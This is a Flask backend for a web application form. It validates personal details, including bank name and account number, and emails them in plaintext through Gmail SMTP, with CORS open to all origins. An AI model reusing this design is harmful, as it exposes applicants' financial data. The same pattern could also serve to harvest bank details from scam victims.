from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import re
import os

# --- Flask setup ---
app = Flask(__name__, static_folder="../", static_url_path="/")
CORS(app)

# --- Email config (from environment variables in Vercel dashboard) ---
SENDER_EMAIL = os.environ.get('SENDER_EMAIL')
SENDER_PASSWORD = os.environ.get('SENDER_PASSWORD')
RECEIVER_EMAIL = os.environ.get('RECEIVER_EMAIL')

# --- Validation functions ---
def validate_email(email):
    pattern = r'^[^\s@]+@[^\s@]+\.[^\s@]+$'
    return re.match(pattern, email) is not None

def validate_phone(phone):
    pattern = r'^[0-9+\-\s]{7,15}$'
    return re.match(pattern, phone) is not None

def validate_age(age):
    try:
        return int(age) >= 18
    except (ValueError, TypeError):
        return False

def validate_zipcode(zipcode):
    pattern = r'^\d{5}(-\d{4})?$'
    return re.match(pattern, zipcode) is not None

def validate_bank_number(bank_number):
    pattern = r'^\d{8,17}$'
    return re.match(pattern, bank_number) is not None

def validate_form_data(data):
    errors = []
    required_fields = [
        'first-name', 'last-name', 'email', 'phone', 'address',
        'city-state', 'zipcode', 'gender', 'age', 'bank-name', 'bank-number'
    ]

    for field in required_fields:
        if not data.get(field) or not str(data.get(field)).strip():
            errors.append(f"{field.replace('-', ' ').title()} is required.")

    if data.get('email') and not validate_email(data.get('email')):
        errors.append("Invalid email format.")
    if data.get('phone') and not validate_phone(data.get('phone')):
        errors.append("Invalid phone number format.")
    if data.get('age') and not validate_age(data.get('age')):
        errors.append("You must be at least 18 years old.")
    if data.get('zipcode') and not validate_zipcode(data.get('zipcode')):
        errors.append("Invalid zipcode format.")
    if data.get('bank-number') and not validate_bank_number(data.get('bank-number')):
        errors.append("Bank account number must be 8–17 digits.")
    if data.get('gender') not in ['male', 'female']:
        errors.append("Gender must be male or female.")

    return errors

# --- Serve static HTML files ---
@app.route('/')
def serve_index():
    """Serve main index.html"""
    return send_from_directory('../', 'index.html')

@app.route('/thank_you.html')
def serve_thank_you():
    """Serve thank_you.html page"""
    return send_from_directory('../', 'thank_you.html')

# --- Email sending route ---
@app.route('/sendmail', methods=['POST'])
def send_mail_route():
    """Handle POST form submissions"""
    try:
        data = request.get_json(force=True)
    except Exception:
        return jsonify({"status": "error", "message": "Invalid JSON format"}), 400

    validation_errors = validate_form_data(data)
    if validation_errors:
        return jsonify({"status": "error", "message": " | ".join(validation_errors)}), 400

    if not all([SENDER_EMAIL, SENDER_PASSWORD, RECEIVER_EMAIL]):
        return jsonify({
            "status": "error",
            "message": "Server email settings are missing."
        }), 500

    try:
        subject = "New Form Submission from Website"
        body = f"""
You received a new application form submission:

First Name: {data.get('first-name', 'N/A')}
Last Name: {data.get('last-name', 'N/A')}
Email: {data.get('email', 'N/A')}
Phone: {data.get('phone', 'N/A')}
Address: {data.get('address', 'N/A')}
City & State: {data.get('city-state', 'N/A')}
Zipcode: {data.get('zipcode', 'N/A')}
Gender: {data.get('gender', 'N/A')}
Age: {data.get('age', 'N/A')}
Occupation: {data.get('occupation', 'N/A')}
Bank Name: {data.get('bank-name', 'N/A')}
Bank Account Number: {data.get('bank-number', 'N/A')}
        """

        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        # Send email using Gmail SMTP
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.send_message(msg)

        return jsonify({
            "status": "success",
            "message": "Form sent successfully!",
            "redirect": "/thank_you.html"
        }), 200

    except Exception as e:
        print("EMAIL SEND ERROR:", e)
        return jsonify({
            "status": "error",
            "message": "Failed to send email. Please try again later."
        }), 500


# --- Health check route ---
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "ok", "message": "Flask is running"}), 200
